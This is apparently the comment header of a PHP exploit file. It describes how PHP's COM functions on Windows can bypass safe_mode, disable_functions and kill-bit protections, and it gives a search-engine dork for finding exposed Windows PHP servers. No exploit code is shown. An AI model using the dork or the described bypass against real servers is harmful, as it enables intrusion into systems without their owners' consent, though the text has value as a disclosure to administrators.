//Tested on xp Pro sp2 full patched, worked both from the cli and on apache

//from: http://www.phpfreaks.com/phpmanual/page/ref.com.html

//Requirements:
//COM functions are only available for the Windows version of PHP.
//.Net support requires PHP 5 and the .Net runtime.

//Installation:
//There is no installation needed to use these functions; they are part of the PHP core. -> (sounds good)
//The windows version of PHP has built in support for this extension. You do not need to
//load any additional extension in order to use these functions.
//You are responsible for installing support for the various COM objects that you intend
//to use (such as MS Word); we don't and can't bundle all of those with PHP.

//mmm... I don't know how many people use Apache and PHP on Windows servers but I suppose there are
//a lot of users if PHP developers decide to implement COM functions as part of PHP core.
//take a look here: intitle:phpinfo intext:"php version" +windows (thanks to rgod).
//Anyway, I think they should take much care on security due to the fact that, through these
//functions, you can seriously compromise a pc.

//For remote execution you need (naturally) to use a server that is MS based,
//e.g. Apache for win configured for working with PHP.
//In this scenario, someone could upload a script and then use it to damnage the server.

//Local execution simply bypass all Windows protections against execution of dangerous
//COM objects (even kill-bit) due to the fact that the script is executed from a client that
//does not check these settings.

//php.ini settings:
//safe_mode = On
//disable_functions = com_load_typelib
//open_basedir = htdocs

//Remote execution requires that open_basedir is disabled
